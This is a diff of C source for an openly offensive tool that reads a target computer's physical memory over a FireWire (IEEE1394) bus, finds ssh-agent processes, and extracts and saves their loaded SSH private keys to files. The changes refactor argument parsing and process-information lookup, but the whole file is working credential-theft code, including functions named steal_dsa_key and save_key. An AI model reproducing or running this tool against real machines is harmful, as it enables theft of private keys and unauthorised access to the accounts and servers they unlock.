@@ -36,6 +36,7 @@
 #include <errno.h>
 #include <string.h>
 #include <time.h>
+#include <getopt.h>
 
 #include <openssl/rsa.h>
 #include <openssl/dsa.h>
@@ -49,14 +50,12 @@
 #include <linear.h>
 #include <endian_swap.h>
 
+#include "proc_info.h"
 #include "ssh-authfile.h"
 #include "sshkey-sanitychecks.h"
 #include "term.h"
 
 char pagedir[4096];
-// stack_bottom is the pagenumber of the highest stackpage.
-// this is shared between get_process_name and resolve_env.
-addr_t stack_bottom = 0;
 
 // if test_keys = 1, we will test the captured keys on the fly.
 // this may take several seconds, depending on keytype and length!
@@ -95,144 +94,9 @@ void dump_page(FILE* f,uint32_t pn, char* page)
 }}}
 #endif
 
-// get_process_name and resolve_env are using the stack bottom of the
-// given process:
-// i have found that after a process starts and parses its ENV and ARGV,
-// all those are in the uppermost page of the userspace (adr < 0xc0000000).
-// in this page, the uppermost (-1) argument is the process name (with
-// about five NUL-characters at the end of the string. before it, environment
-// variables follow, each separated by a NUL-character. before this, the
-// ARGV and before this, \0\0.
-
-// return the process name in a malloc'ed buffer or NULL, if none.
-// set stack_bottom so successive queries (resolve_env) don't need to
-// search again.
-char* get_process_name(linear_handle h)
-{{{
-	addr_t pn;
-	addr_t padr;
-	char* page;
-	page = malloc(4096);
-	int valid_page = 0;
-
-	char* ret = NULL;
-
-	stack_bottom = 0;
-	pn = 0xbffff;
-
-	while(!valid_page && pn >= 0xbf000) {
-		if(linear_to_physical(h, pn*4096, &padr)) {
-			// page is not mapped
-		} else {
-			// found stack bottom
-			valid_page = 1;
-			stack_bottom = pn;
-
-			if(linear_read_page(h, pn, page))
-				printf("UNREADABLE PAGE\n");
-			else {
-				char* p = page + 4096 - 1;
-
-				// in stack: seek process name
-				while( (*p == 0) && (p >= page) )
-					p--;
-				while( (*p != 0) && (p >= page) )
-					p--;
-				p++;
-				ret = malloc(strlen(p) + 1);
-				strcpy(ret, p);
-			}
-		}
-		pn--;
-	}
-
-	free(page);
-
-	return ret;
-}}}
-
-// will try to resolve an environment variable of the given process
-// by looking at the bottom of the stack.
-// returns NULL or env-vars contents in an malloced buffer.
-//
-// uses stack_bottom from get_process_name()
-char* resolve_env(linear_handle h, char* envvar)
-{{{
-	int i;
-	char* stack;			// buffer with all relevant pages (MAX_ARG_PAGES)
-	char* p;			// pointer to count downward in stack
-	char* q;			// points to value of env-var
-	char* ret = NULL;		// to return an pointer to the alloced string
-	int env_ok;			// still environment vars?
-	int found_eq;			// still an '=' in this var?
-
-	// fail if we did not find a stack bottom
-	if(!stack_bottom)
-		return NULL;
-
-	// on linux, the max environment and argument is limited by PAGESIZE * MAX_ARG_PAGES
-	// MAX_ARG_PAGES is 32 (statically defined in include/linux/binfmts.h)
-	// so we will read 32 pages of the stack (if there are that many)
-#define MAX_ARG_PAGES 32
-	stack = calloc(MAX_ARG_PAGES, 4096);
-	// watch off by one
-	for( i=1; i<=MAX_ARG_PAGES; i++) {
-		linear_read_page(h, stack_bottom-MAX_ARG_PAGES+i, stack + (4096*(i-1) ));
-		// don't care for errors.
-	}
-
-	// start at bottom of stack
-	p = stack + (4096*MAX_ARG_PAGES) - 1;
-	// skip \0 at the end
-	while( (*p == 0) && (p >= stack) )
-		p--;
-	// skip process name
-	while( (*p != 0) && (p >= stack) )
-		p--;
-	// abort if there is no stuff
-	if(p == stack)
-		return NULL;
-	// now process each \0-separated entry and check
-	// for an equal-sign '='
-	env_ok = 1;
-	while(env_ok) {
-		// we have not found a '=' here, yet.
-		found_eq = 0;
-		// go to beginning of string
-		p--; // (we are currently pointing at the \0 after the string)
-		while( (*p != 0) && (p >= stack) ) {
-			if(*p == '=') {
-				found_eq = 1;
-				*p = 0;
-				q = p+1;
-			}
-			p--;
-		}
-		if(p == stack) {env_ok = 0; break;}
-		if(!found_eq) {env_ok = 2; break;}
-		
-		// p   q
-		// |   |
-		// FOO=BAR
-		//    |
-		//    \0
-		if(!strcmp(envvar, p+1)) {
-			// we found the var
-			ret = malloc(strlen(q) + 1);
-			strcpy(ret, q);
-			break;
-		}
-	}
-
-	return ret;
-}}}
-
-
-
-
 // fix a remote bignum to a local bignum:
 // copy all important internal data of struct bignum_st.
-// returns malloc'ed bignum.
+// returns malloc()d bignum.
 BIGNUM* fix_bignum(linear_handle lin, BIGNUM* rb)
 {{{
 	addr_t p;
@@ -468,13 +332,12 @@ int steal_dsa_key(linear_handle lin, Key* key)
 
 // create a unique filename, consisting of target's 1394-GUID, ssh-agent's
 // username and key's comment and save the key to this file.
-void save_key(linear_handle lin, char* key_comment, Key* key)
+void save_key(linear_handle lin, char *key_comment, Key* key, char *username)
 {{{
 	uint32_t high;
 	uint32_t low;
 	uint64_t guid;
 
-	char* username;
 	char* comment;
 	char* p;
 
@@ -490,9 +353,6 @@ void save_key(linear_handle lin, char* key_comment, Key* key)
 #else
 	guid = (((uint64_t)low) << 32) | high;
 #endif
-
-	// get username of this agent
-	username = resolve_env(lin, "USER");
 
 	// create a comment that does not contain slashes
 	comment = malloc(strlen(key_comment) + 1);
@@ -519,7 +379,6 @@ void save_key(linear_handle lin, char* key_comment, Key* key)
 	free(comment_field);
 	free(filename);
 	free(comment);
-	free(username);
 }}}
 
 
@@ -531,7 +390,7 @@ void save_key(linear_handle lin, char* key_comment, Key* key)
 //	if found:
 //		print identity.death (time of death of this key)
 //		steal identity.key
-void check_ssh_agent(linear_handle lin)
+void check_ssh_agent(linear_handle lin, char **envv)
 {{{
 #	define AGENT_START	0x08000
 #	define AGENT_MAXLEN	0x00800
@@ -539,14 +398,14 @@ void check_ssh_agent(linear_handle lin)
 #	define LOCAL_TO_REMOTE(l,lbase)	((char*) (l - lbase + (AGENT_START << 12)) )
 
 	char identity_path[1024];
-	char* heap;	// actually this is a dump of the executable and heap
+	char *heap;	// actually this is a dump of the executable and heap
 			// but we don't care for the executable.
-	char* home;
+	char *home;
 	addr_t pn;
 
-	char* comment;	// location of the comment field
-	char* rcomment; // remote location of the comment field
-	char* identity; // location of struct identity (actually pointing somewhere into it)
+	char *comment;	// location of the comment field
+	char *rcomment; // remote location of the comment field
+	char *identity; // location of struct identity (actually pointing somewhere into it)
 	addr_t ridentity;
 	addr_t rkey;	// remote location of the key
 	time_t t;	// local time
@@ -554,20 +413,19 @@ void check_ssh_agent(linear_handle lin)
 	Key key;	// the key we want
 	int n;
 #ifdef DUMP_HEAP
-	FILE* heapfile;
+	FILE *heapfile;
 #endif
 
 	printf( TERM(TERM_A_BLINK,TERM_C_BG_RED) "hit:" TERM_RESET " ");
 
 	// get string we search for
-	home = resolve_env(lin, "HOME");
+	home = resolve_env(envv, "HOME");
 	if(!home) {
 		printf("failed to lookup $HOME!> ");
 		return;
 	}
 
 	snprintf(identity_path, 1024, "%s/.ssh/", home);
-	free(home);
 	printf("identity path would be \"%s\"> ", identity_path);
 	// now lets seek for this string. it will be located somewhere
 	// on the heap, right behind the executable.
@@ -669,7 +527,7 @@ void check_ssh_agent(linear_handle lin)
 		}
 		// save the key to a file
 		if(key.rsa || key.dsa)
-			save_key(lin, comment, &key);
+			save_key(lin, comment, &key, resolve_env(envv, "USER"));
 
 		// TODO: free key...
 	}
@@ -682,7 +540,7 @@ void check_ssh_agent(linear_handle lin)
 // show usage info
 void usage(char* argv0)
 {{{
-	printf(	"%s <"TERM_YELLOW"node-id"TERM_RESET"> ["TERM_BLUE"-t"TERM_RESET"]\n"
+	printf(	"%s ["TERM_BLUE"-t"TERM_RESET"] <"TERM_YELLOW"node-id"TERM_RESET">\n"
 		"\n"
 		"i will snarf ssh public/private keypairs from all ssh-agents i can\n"
 		"find on the system hanging on your IEEE1394 bus with the given\n"
@@ -694,8 +552,8 @@ void usage(char* argv0)
 		"of RAM and that i only search for ``ssh-agent'' processes and keys\n"
 		"loaded into them with the absolute path of ``$HOME/.ssh''.\n"
 		"\n"
-		"if you specify ``"TERM_BLUE"-t"TERM_RESET"'' as second parameter ("TERM_RED"and only as 2nd"TERM_RESET"), i will\n"
-		"try to verify that the snarfed keypair is ok.\n"
+		"if you specify ``"TERM_BLUE"-t"TERM_RESET"'' i will try to verify that the snarfed\n"
+		"keypair is ok.\n"
 		"\n"
 		,
 		argv0
@@ -713,53 +571,47 @@ int main(int argc, char**argv)
 	addr_t pn;
 	char page[4096];
 	float prob;
-	int res;
+	int c;
+	char *p;
 
-	// create and associate a physical source to /dev/mem
-	phy = physical_new_handle();
-	if(!phy) {
-		printf("physical handle is null\n");
-		return -1;
-	}
-	if(argc != 2 && argc != 3) {
-		usage(argv[0]);
-		return -2;
-	}
-
-	if(argc == 3) {
-		if(0 == strcmp(argv[2], "-t")) {
-			test_keys = 1;
-		} else {
-			usage(argv[0]);
-			return -2;
+	// parse arguments
+	while( -1 != (c = getopt(argc, argv, "t"))) {
+		switch (c) {
+			case 't':
+				test_keys = 1;
+				break;
+			default:
+				usage(argv[0]);
+				return -2;
+				break;
 		}
 	}
+	if(NULL == argv[optind])
+		{ printf("please give nodeid\n"); usage(argv[0]); return -2; }
+	c = strtoll(argv[optind], &p, 10);
+	if((argv[optind] == p) || (c > 63) || (c < 0))
+		{ printf("invalid nodeid. nodeid should be >=0 and <64.\n"); usage(argv[0]); return -2; }
 
+	// prepare and associate physical handle
+	phy = physical_new_handle();
+	if(!phy)
+		{ printf("physical handle is null! insufficient memory?!\n"); return -1; }
+	// create raw1394handle
 	phy_data.ieee1394.raw1394handle = raw1394_new_handle();
-        if(!phy_data.ieee1394.raw1394handle) {
-                printf("failed to open raw1394\n");
-                return -3;
-        }
-	if(raw1394_set_port(phy_data.ieee1394.raw1394handle, 0)) {
-		printf("raw1394 failed to set port\n");
-		return -3;
-	}
-	res = atoi(argv[1]);
-	if((res > 63) || (res < 0)) {
-		printf("nodeid too big!\n\n");
-		usage(argv[0]);
-		return -2;
-	}
-	phy_data.ieee1394.raw1394target = res + NODE_OFFSET;
-		
+	if(!phy_data.ieee1394.raw1394handle)
+		{ printf("failed to open raw1394\n"); return -3; }
+	// associate raw1394 to port
+	if(raw1394_set_port(phy_data.ieee1394.raw1394handle, 0))
+		{ printf("raw1394 failed to set port\n"); return -3; }
+	// set attack target
+	phy_data.ieee1394.raw1394target = c + NODE_OFFSET;
 	printf("using target %d\n", phy_data.ieee1394.raw1394target - NODE_OFFSET);
-	printf("associating physical source with raw1394\n"); fflush(stdout);
 	if(physical_handle_associate(phy, physical_ieee1394, &phy_data, 4096)) {
 		printf("physical_handle_associate() failed\n");
 		return -3;
 	}
-	// associate linear
-	printf("new lin handle..\n"); fflush(stdout);
+
+	// prepare and associate linear handle
 	lin = linear_new_handle();
 	printf("assoc lin handle..\n"); fflush(stdout);
 	if(linear_handle_associate(lin, phy, arch_ia32)) {
@@ -772,7 +624,8 @@ int main(int argc, char**argv)
 		    "\t\t_    -   matched simple expression but not NCD\n"
 		    "\t\to    -   matched NCD but failed to load referenced pagetables\n"
 		    "\t\tK    -   matched NCD, loaded but found no stack (kernel thread?)\n"
-		    "\t\tU<n> -   matched NCD, loaded, found stack and process name ``n''\n"
+		    "\t\tE    -   loaded, found stack, but unable to parse stack\n"
+		    "\t\tU<n> -   loaded, found stack, process name ``n''\n"
 		    "\n");
 	// search all pages for pagedirs
 	// then, for each found, print process name
@@ -781,18 +634,22 @@ int main(int argc, char**argv)
 		fflush(stdout);
 		if((pn%0x80) == 0)
 			putchar('.');
-		res = linear_is_pagedir_fast(lin, pn);
-		if(res < 0) {
+		c = linear_is_pagedir_fast(lin, pn);
+		if(c < 0) {
 			printf("\n\n" TERM_RED "failed to read page 0x%05llx. aborting." TERM_RESET "\n", pn);
 			break;
 		}
 
-		if(res) {
+		if(c) {
 			// load page
 			physical_read_page(phy, pn, page);
 			prob = linear_is_pagedir_probability(lin, page);
 			if(prob > 0.01) {
-				char* pname;
+				char *bin;
+				int    argc;
+				char **argv;
+				int    envc;
+				char **envv;
 
 				// set the pagedir
 				//printf("page 0x%05llx prob: %0.3f", pn, prob);
@@ -802,18 +659,22 @@ int main(int argc, char**argv)
 				}
 
 				// get process name
-				pname = get_process_name(lin);
-				if(!pname) {
-					printf(TERM(TERM_A_NORMAL,TERM_C_FG_RED) "K" TERM_RESET);
-					continue;
+				if(1 == proc_info(lin, &argc, &argv, &envc, &envv, &bin)) {
+					if(bin) {
+						printf("U" TERM(TERM_A_NORMAL,TERM_C_FG_BLUE) "<%s>" TERM_RESET, bin);
+
+						// check for ssh-agent
+						if((!strcmp(bin, "ssh-agent") || !strcmp(bin, "/usr/bin/ssh-agent")))
+							check_ssh_agent(lin, envv);
+					} else {
+						printf(TERM(TERM_A_NORMAL,TERM_C_FG_RED) "K" TERM_RESET);
+					}
+
+					free(envv);
+					free(argv);
+				} else {
+					putchar('E');
 				}
-				printf("U" TERM(TERM_A_NORMAL,TERM_C_FG_BLUE) "<%s>" TERM_RESET, pname);
-
-				// check for ssh-agent
-				if((!strcmp(pname, "ssh-agent") || !strcmp(pname, "/usr/bin/ssh-agent")))
-					check_ssh_agent(lin);
-
-				free(pname);
 			} else {
 				putchar('_');
 			}
@@ -822,13 +683,10 @@ int main(int argc, char**argv)
 	printf("\n\n");
 
 	// release handles
-	printf("rel lin handle..\n"); fflush(stdout);
 	linear_handle_release(lin);
-	printf("rel phy handle..\n"); fflush(stdout);
+	raw1394_destroy_handle(phy_data.ieee1394.raw1394handle);
 	physical_handle_release(phy);
 	
-	// exit 
-	raw1394_destroy_handle(phy_data.ieee1394.raw1394handle);
 	return 0;
 }}}
 
